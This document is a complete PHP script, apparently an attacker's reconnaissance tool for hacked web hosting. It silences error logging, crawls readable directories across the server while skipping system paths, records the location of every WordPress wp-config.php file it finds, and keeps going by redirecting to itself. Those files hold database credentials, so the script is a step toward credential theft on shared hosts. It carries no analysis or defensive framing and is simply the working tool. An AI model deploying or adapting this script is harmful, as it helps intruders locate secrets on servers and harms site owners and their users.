<?php
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@set_time_limit(3600);

error_reporting(0);


echo date("H:i:s");
echo "<br>\n";

function strposa($haystack, $needle, $offset=0) {
    if(!is_array($needle)) {$needle = array($needle);}
        foreach($needle as $query) {
            if(strpos($haystack, $query, $offset) !== false) return true;
        }
    return false;
}

function DeadLetter(){
       die("<script>alert('End work');</script>");
}

if(!function_exists('stripos')) {
    function stripos($haystack, $needle, $offset = 0) {
    return strpos(strtolower($haystack), strtolower($needle), $offset);
    }
}

if(!function_exists('file_put_contents')) {
    function file_put_contents($file_name, $data) {
        $f = fopen($file_name,"w");
        fputs($f,$data);
        fclose($f);
    }
}   



function Get_Task_Number(){
    $count_file = '_task_n';
    if (file_exists($count_file)){
        $count = (int)file_get_contents($count_file);
        $new_count = $count+1;
        file_put_contents($count_file,$new_count);
        return $count;
    } else {
    	file_put_contents($count_file,'1');
        return 0;
    }
}

function Get_Task(){
    $task_file = '_task';
    clearstatcache();
    if (file_exists($task_file)){
        $count = Get_Task_Number();
        echo "Task num: $count <br>\n";
        $counter = 0;
        $handle = @fopen($task_file, "r");
        if ($handle) {
            while (($buffer = fgets($handle, 4096)) !== false) {
                if($counter == $count) {return trim($buffer);}
            $counter++;
            }
        fclose($handle);
        }
    
    } 
    return false;
}

function Check_Bad_Dir($fname){
    
    $part[] = 'snapshot';
    $part[] = '/.git';
    $part[] = 'lost+found';
    $part[] = '/cgroups_';
    $part[] = '/wflogs';
    $part[] = '/awstats';

    if(isset($_COOKIE['fast_worker'])){
        $part[] = 'wp-admin';
        $part[] = 'wp-content';
        $part[] = 'wp-includes';
        $part[] = 'cgi-bin';
        $part[] = 'mail';
    }
    
    $full[] = '/proc';
    $full[] = '/usr/lib';
    $full[] = '/tmp';
    $full[] = '/etc';
    $full[] = '/lib';
    $full[] = '/lib64';
    $full[] = '/bin';
    $full[] = '/sbin';
    $full[] = '/usr/etc';
    $full[] = '/boot';
    $full[] = '/dev';
    $full[] = '/opt';
    $full[] = '/selinux';
    $full[] = '/bin';
    $full[] = '/var/log';
    $full[] = '/var/cache';
    $full[] = '/usr/doc';
    $full[] = '/usr/X11R6';
    $full[] = '/usr/games';
    $full[] = '/usr/src';
    $full[] = '/usr/include';
    $full[] = '/usr/kerberos';
    $full[] = '/var/spool';
    $full[] = '/var/run';
    $full[] = '/var/lock';
    $full[] = '/usr/man';
    $full[] = '/var/db';
    $full[] = '/var/local';
    $full[] = '/var/mail';
    $full[] = '/usr/share/doc';
    $full[] = '/usr/share/man';
    $full[] = '/usr/share/X11';
    $full[] = '/usr/share/locale';
    $full[] = '/usr/share/perl';
    $full[] = '/usr/share/vim';
    $full[] = '/usr/share/icons';
    $full[] = '/sys';
    $full[] = '/usr/local/lib64';
    $full[] = '/usr/local/share/perl5';
    $full[] = '/usr/share/texmf';
    $full[] = '/usr/share/zoneinfo';
    $full[] = '/usr/share/texmf';
    $full[] = '/usr/share/themes';
    $full[] = '/FAKEFS';
    $full[] = '/usr/local/cpanel';
    $full[] = '/usr/portage';
    $full[] = '/mod_pagespeed/cache';
    $full[] = '/usr/ports';
    $full[] = '/usr/share/ri';
    $full[] = '/home/mailquota';
    $full[] = '/var/tmp';
    $full[] = '/var/profiles';
    $full[] = '/var/opt';
    $full[] = '/var/yp';
    $full[] = '/var/netenberg';
    $full[] = '/var/empty';
    $full[] = '/var/account';
    $full[] = '/var/crash';
    $full[] = '/var/cvs';
    $full[] = '/var/asl';
    $full[] = '/var/named';
    $full[] = '/var/lib';
    $full[] = '/var/games';
    $full[] = '/var/hostgator';
    $full[] = '/usr/sbin';
    $full[] = '/usr/bin';
    $full[] = '/usr/libexec';
    $full[] = '/usr/php4';
    $full[] = '/usr/share';
    $full[] = '/usr/lib64';
    $full[] = '/usr/local/lib';

    if (strposa($fname, $part)){
    return true;
    }
    if (in_array($fname,$full)){
    return true;
    }
    return false;
}

function Add_Task($dir){
	echo "Add $dir <br>\n";
    $task_file = '_task';
    $dir = trim($dir);
    $dir = str_replace('//','/',$dir);
    if (strlen($dir) > 2){
        $ypos = strlen($dir)-1;
        if($dir[$ypos] == '/'){
            $dir = substr($dir,0,$ypos);
        }
    }
    if (!@is_readable($dir)){return true;}
    if (Check_Bad_Dir($dir)){return true;}
 
    clearstatcache();
    if (file_exists($task_file)){
        $handle = @fopen($task_file, "r");
        if ($handle) {
            while (($buffer = fgets($handle, 4096)) !== false) {
                $buffer = trim($buffer);
                if($dir == $buffer){return false;}
            }
            fclose($handle);
        }
    } 
	$f = fopen($task_file,"a");
	fputs($f,"$dir". PHP_EOL);
	fclose($f);
}

function log_wp($file){
    $f = fopen('wp_log', "a");
    fputs($f,"$file\n");
    fclose($f);
}




function Scan_Dir($dir) {
    echo "Scan: $dir <br>\n";
    $odir = @opendir($dir);
    while (($file = @readdir($odir)) !== FALSE) {
    	if ($file == '.' || $file == '..'){
            continue; 
        }
        if (is_dir($dir.DIRECTORY_SEPARATOR.$file) && (!is_link($dir.DIRECTORY_SEPARATOR.$file)) && (@is_readable($dir.DIRECTORY_SEPARATOR.$file))){
            Add_Task($dir.DIRECTORY_SEPARATOR.$file);
        }
        if($file == 'wp-config.php'){
            log_wp($dir.DIRECTORY_SEPARATOR.$file);
        }
    }
        @closedir($odir);
}

$work_count = 0;
while ( $work_count<= 25) {
	$dir = Get_Task();
	if ($dir === false){DeadLetter();} else {
	echo "Working dir: $dir <br>\n";
	Scan_Dir($dir);
	$work_count++;
}
}
echo "<script>window.location.href = 'i.php?' + Math.random();</script>";


